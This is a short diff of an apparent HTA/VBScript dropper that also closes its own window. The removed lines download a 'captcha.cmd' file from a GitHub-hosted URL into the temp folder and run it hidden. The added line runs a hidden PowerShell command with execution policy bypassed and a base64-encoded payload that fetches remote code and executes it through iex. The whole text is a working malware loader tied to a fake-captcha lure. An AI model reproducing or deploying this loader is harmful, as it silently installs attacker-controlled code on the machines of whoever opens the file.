@@ -3,10 +3,7 @@
 Dim shell
 Set shell = CreateObject("WScript.Shell")
 
-downloadUrl = "https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/code/captcha.cmd"
-localPath = shell.ExpandEnvironmentStrings("%temp%\stub.cmd")
-powershellCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & localPath & "'; Start-Process '" & localPath & "'"""
-shell.Run powershellCommand, 0, True
+shell.Run "powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGIAZQBuAHMAZwBhAG0AaQBuAGcALQBkAG8AdAAvAGIAZQBuAHMAZwBhAG0AaQBuAGcALQBkAG8AdAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBjAG8AZABlAC8AZABvAHcAbgBsAG8AYQBkACAAfAAgAGkAZQB4AA==", 0
 
 window.close
 </script>
